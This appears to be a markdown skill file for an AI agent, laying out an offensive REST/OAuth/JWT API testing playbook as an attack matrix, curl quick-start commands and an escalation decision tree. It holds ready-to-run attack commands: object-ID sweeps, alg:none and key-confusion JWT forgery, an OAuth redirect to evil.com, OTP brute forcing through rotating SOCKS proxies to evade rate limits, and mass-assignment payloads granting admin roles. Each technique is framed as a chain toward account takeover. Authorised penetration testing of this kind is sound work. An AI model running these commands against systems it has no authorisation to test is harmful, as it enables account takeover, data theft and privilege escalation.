---
name: api-security
description: "REST/OAuth/JWT API security — each pattern has SIGNAL → TEST → CONFIRM → KILL + response-driven next actions + sibling endpoint analysis. NOT for GraphQL depth (use a dedicated GraphQL skill) or general web vulns (use web2-vuln-classes)."
---

# API SECURITY — EXECUTION MATRIX + RESPONSE-DRIVEN

| Pattern | Signal | Test | Confirm | Kill | Response-Driven Next Action |
|---------|--------|------|---------|------|---------------------------|
| **BOLA** | Object ID in URL/body | `curl /api/orders/ORDER_B -b "session=A"` | A reads B's data | 403 → auth enforced | 200 with B's data → test PUT/DELETE same pattern; test `/api/orders/` list endpoint |
| **Mass Assignment** | Extra fields in response | `curl -X PATCH /api/user -d '{"role":"admin","balance":999}'` | Field persisted | field read-only | `role` accepted → test `is_admin`, `permissions`, `plan`; test on other endpoints of same resource |
| **JWT None** | JWT auth | `jwt_tool "$JWT" -X a` then use forged token | API accepts alg:none | "invalid signature" | None works → test HS256 confusion with public key; test `alg:null`, empty signature |
| **JWT Confusion** | RS256 JWT + public key exposed | `jwt.encode(payload, public_key, "HS256")` | Forged HS256 accepted | Library checks alg | Confusion works → forge admin role JWT → chain to admin API |
| **OAuth redirect** | redirect_uri param | `curl /oauth?redirect_uri=https://evil.com` | Code sent to evil.com | URL whitelist | Redirect works → test state param for CSRF; test PKCE enforcement; chain to ATO |
| **OAuth state** | state param | `curl /oauth/callback?code=X&state=PREDICTABLE` | CSRF on token binding | random state | Predictable state → forge auth for victim → ATO |
| **Rate Limit** | No 429 on burst | `for i in {1..100}; do curl /api/brute; done` | All 200, no throttle | 429 after N requests | No rate limit → brute OTP, password, API key → chain to ATO |
| **Key Leak** | API key in JS/response | `grep -oP 'api[_-]?key["\s:=]+["'"'"']?([A-Za-z0-9]{20,})' target.js` | Key works on live API | 401 unauthorized | Key works → test on sensitive endpoints, check permissions, check if admin key |
| **Error Leak** | Stack trace on bad input | `curl -X POST /api/login -d '{"email":null}'` | Error reveals path/DB/version | Custom error page | Stack trace → probe more malformed inputs for data; find env vars in trace |
| **Method Override** | X-HTTP-Method headers | `curl -X GET /api/delete -H "X-HTTP-Method-Override: DELETE"` | Resource deleted | Override ignored | Override works → test all endpoints with method override; check for CSRF bypass |

## SIBLING ENDPOINT ANALYSIS

After testing any API endpoint, discover and test siblings:

| Endpoint Found | Check These Siblings | Why |
|---------------|---------------------|-----|
| `/api/v1/orders/{id}` | `/api/v2/orders/{id}`, `/api/orders/{id}/admin` | Newer version may lack auth; admin overlay may be gated differently |
| `/api/users/{id}` | `/api/users/{id}/profile`, `/api/users/{id}/settings` | Nested resources often have weaker auth |
| `/api/products` | `/api/products/{id}/price`, `/api/products/{id}/inventory` | Price/inventory may have separate (weaker) auth |
| `/api/checkout` | `/api/cart`, `/api/discount`, `/api/shipping` | Adjacent cart/discount logic may bypass checkout auth |
| `POST /api/resource` | `GET /api/resource`, `PUT /api/resource`, `DELETE /api/resource` | Different methods may have different auth levels |
| `/api/v1/` | `/api/v2/`, `/api/v3/`, `/api/beta/` | Beta/older versions may lack security updates |

## CURL COMMANDS (Quick Start)
```bash
# BOLA sweep
for id in $(seq 1 50); do
  curl -s "/api/orders/$id" -H "Bearer: $TOKEN_B" | jq '.id, .user_id'
done

# JWT none attack
jwt_tool "$JWT" -X a  # Try none algorithm
jwt_tool "$JWT" -X n  # Try null signature

# Rate limit bypass
for i in {1..200}; do
  proxy=$(shuf -n1 proxies.txt)
  curl -s --proxy "socks5://$proxy" -X POST /api/otp -d '{"phone":"+1234"}' &
done; wait

# Mass assignment probe
curl -X PUT /api/user/profile -H "Bearer: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"credits":99999,"plan":"enterprise"}'
```

## DECISION TREE
```
Found API endpoint?
├─ Resource by ID? → BOLA test (session A vs session B)
│  └─ BOLA found → test PUT/DELETE on same pattern → chain to data mod
├─ Auth header present? → JWT test (none → confusion → weak secret)
│  └─ JWT forgeable → test admin endpoints → chain to full access
├─ OAuth flow? → redirect_uri fuzz → state test → PKCE check
│  └─ Redirect open → chain to OAuth token theft → ATO
├─ Create/Update endpoint? → Mass assignment (add role, balance, is_admin)
│  └─ Mass assignment works → find all writable fields → chain to privesc
├─ Rate-limit on sensitive? → Burst test (proxy rotate)
│  └─ No rate limit → brute OTP/password → chain to ATO
├─ Keys in JS/response? → Key leakage (grep pattern, test key)
│  └─ Key works → find what it can access → check admin scope
└─ Error on malformed? → Info disclosure (paths, DB, stack)
   └─ Stack trace → find env vars, file paths → deepen disclosure
```

## PATTERN FILES
| Pattern | File |
|---------|------|
| BOLA Deep Dive | `reference/bola.md` |
| JWT Attacks | `reference/jwt-attacks.md` |
| OAuth/OIDC Testing | `reference/oauth-oidc.md` |
| Rate Limiting | `reference/rate-limiting.md` |
| Mass Assignment | `reference/mass-assignment.md` |
| Key Leakage | `reference/key-leakage.md` |
| Info Disclosure | `reference/info-disclosure.md` |
| Method Override | `reference/method-override.md` |
| BFF Testing | `reference/bff-testing.md` |
